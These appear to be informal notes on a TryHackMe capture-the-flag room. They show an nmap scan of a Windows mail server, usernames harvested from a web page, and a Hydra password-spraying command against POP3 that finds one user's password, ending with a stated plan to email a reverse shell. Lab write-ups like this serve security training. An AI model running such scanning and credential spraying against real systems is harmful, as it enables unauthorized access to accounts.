<code>

https://tryhackme.com/room/yougotmail
  
alias https://brownbrick.co/
not fill to etc/hosts

```root@ip-10-10-123-138:~# nmap -sV brownbrick.co
Starting Nmap 7.80 ( https://nmap.org ) at 2025-10-06 14:05 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for brownbrick.co (10.10.239.127)
Host is up (0.00056s latency).
Not shown: 992 closed ports
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
110/tcp  open  pop3          hMailServer pop3d
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          hMailServer imapd
445/tcp  open  microsoft-ds?
587/tcp  open  smtp          hMailServer smtpd
3389/tcp open  ms-wbt-server Microsoft Terminal Services
MAC Address: 02:1A:41:63:2C:59 (Unknown)
Service Info: Host: BRICK-MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows
```


**Username Enumeration**
from web page
oaurelius@brownbrick.co
wrohit@brownbrick.co
lhedvig@brownbrick.co
tchikondi@brownbrick.co
pcathrine@brownbrick.co
fstamatis@brownbrick.co


oot@ip-10-10-196-188:~# hydra -L /root/Desktop/users -p bricks pop3://10.10.98.112
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-06 16:15:48
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 6 tasks per 1 server, overall 6 tasks, 6 login tries (l:6/p:1), ~1 try per task
[DATA] attacking pop3://10.10.98.112:110/
[110][pop3] host: 10.10.98.112   login: lhedvig@brownbrick.co   password: bricks
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-06 16:15:49

try rdp access with user creds .. nothing
try smb enumeration with user creds .. nothing
try pop3 with user creds .. nothing

you must send mail with reverse shell

